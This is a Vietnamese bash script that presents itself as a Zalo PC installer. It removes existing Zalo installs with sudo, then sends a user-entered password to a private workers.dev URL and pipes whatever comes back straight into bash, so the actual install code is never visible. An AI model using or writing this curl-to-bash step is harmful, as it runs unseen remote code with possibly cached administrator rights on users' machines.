#!/bin/bash

set -e

WORKER_URL="https://private-script-sentosa.cloud07622.workers.dev"

echo "================================"
echo "    CÀI ĐẶT ZALO PC VER 2.2.6   "
echo "================================"
echo


# ============================================================
# KIỂM TRA ZALO ĐÃ CÀI TRƯỚC KHI CÀI BẢN MỚI
# ============================================================

ZALO_PKGS=$(dpkg-query -W -f='${binary:Package}\n' 2>/dev/null \
    | grep -Ei '^zalo(-linux-builder|-linux-darling|-linux|-mac)?(:|$)' \
    || true)

ZALO_INSTALLED=0
ZALO_VERSION=""

if [ -n "$ZALO_PKGS" ]; then
    ZALO_INSTALLED=1

    # Lấy phiên bản của package Zalo đầu tiên tìm được.
    FIRST_ZALO_PKG=$(printf '%s\n' "$ZALO_PKGS" | head -n 1)
    ZALO_VERSION=$(dpkg-query -W -f='${Version}' "$FIRST_ZALO_PKG" 2>/dev/null || true)
fi

# Trường hợp package không còn trong dpkg nhưng thư mục cài đặt vẫn tồn tại.
if [ "$ZALO_INSTALLED" -eq 0 ] && {
    [ -d "/opt/Zalo" ] || [ -d "/opt/zalo" ] || [ -d "/opt/zalo-linux" ];
}; then
    ZALO_INSTALLED=1
    ZALO_VERSION="không xác định"
fi

if [ "$ZALO_INSTALLED" -eq 1 ]; then
    echo "================================"
    echo "       ZALO ĐÃ ĐƯỢC CÀI ĐẶT"
    echo "================================"
    echo
    echo "Máy bạn đang có Zalo phiên bản: $ZALO_VERSION"
    echo
    echo "Bạn có muốn gỡ cài đặt Zalo cũ không?"
    echo
    echo "  1. Gỡ Zalo cũ và tiếp tục hỏi cài bản mới"
    echo "  2. Hủy lệnh"
    echo

    while true; do
        read -rp "Lựa chọn [1-2]: " REMOVE_CHOICE

        case "$REMOVE_CHOICE" in
            1)
                echo
                echo "Đang gỡ Zalo cũ..."
                echo

                # Dừng Zalo đang chạy
                pkill -f '/opt/Zalo' 2>/dev/null || true
                pkill -f '/opt/zalo' 2>/dev/null || true
                pkill -f 'zalo-linux' 2>/dev/null || true

                # Gỡ đúng các package Zalo đã tìm thấy
                if [ -n "$ZALO_PKGS" ]; then
                    sudo apt purge -y $ZALO_PKGS
                fi

                # Xóa thư mục cài đặt hệ thống Zalo
                sudo rm -rf /opt/Zalo
                sudo rm -rf /opt/zalo
                sudo rm -rf /opt/zalo-linux

                # Xóa launcher Zalo cũ
                rm -f "$HOME/.local/share/applications/zalo.desktop"
                rm -f "$HOME/.local/share/applications/zalo-linux.desktop"
                rm -f "$HOME/.local/share/applications/Zalo.desktop"
                rm -f "$HOME/.local/share/applications/ZaloMac.desktop"

                sudo rm -f /usr/share/applications/zalo.desktop
                sudo rm -f /usr/share/applications/zalo-linux.desktop
                sudo rm -f /usr/share/applications/Zalo.desktop
                sudo rm -f /usr/share/applications/ZaloMac.desktop

                echo
                echo "================================"
                echo "       ĐÃ GỠ ZALO THÀNH CÔNG"
                echo "================================"
                echo
                break
                ;;
            2)
                echo
                echo "Đã hủy lệnh. Không thay đổi Zalo hiện tại."
                unset PASSWORD
                exit 0
                ;;
            *)
                echo "Lựa chọn không hợp lệ. Vui lòng chọn 1 hoặc 2."
                ;;
        esac
    done

    echo
    echo "Máy bạn đã gỡ Zalo thành công."
    echo "Bạn có muốn cài phiên bản mới không?"
    echo
    echo "  1. Tiếp tục cài bản mới"
    echo "  2. Thoát và không cài gì tiếp"
    echo

    while true; do
        read -rp "Lựa chọn [1-2]: " INSTALL_CHOICE

        case "$INSTALL_CHOICE" in
            1)
                echo
                echo "Tiếp tục tải và cài Zalo phiên bản mới..."
                echo
                break
                ;;
            2)
                echo
                echo "Đã thoát. Zalo cũ đã được gỡ và không cài bản mới."
                unset PASSWORD
                exit 0
                ;;
            *)
                echo "Lựa chọn không hợp lệ. Vui lòng chọn 1 hoặc 2."
                ;;
        esac
    done
fi

unset ZALO_PKGS
unset ZALO_INSTALLED
unset ZALO_VERSION
unset FIRST_ZALO_PKG
unset REMOVE_CHOICE
unset INSTALL_CHOICE

read -rsp "Nhập mật khẩu cài đặt: " PASSWORD
echo
echo

# Gửi password xác thực
printf '%s' "$PASSWORD" | python3 -c '
import sys
import json
print(json.dumps({"password": sys.stdin.read()}))
' | curl -fsSL \
    -X POST \
    -H "Content-Type: application/json" \
    --data-binary @- \
    "$WORKER_URL/script" | bash

unset PASSWORD
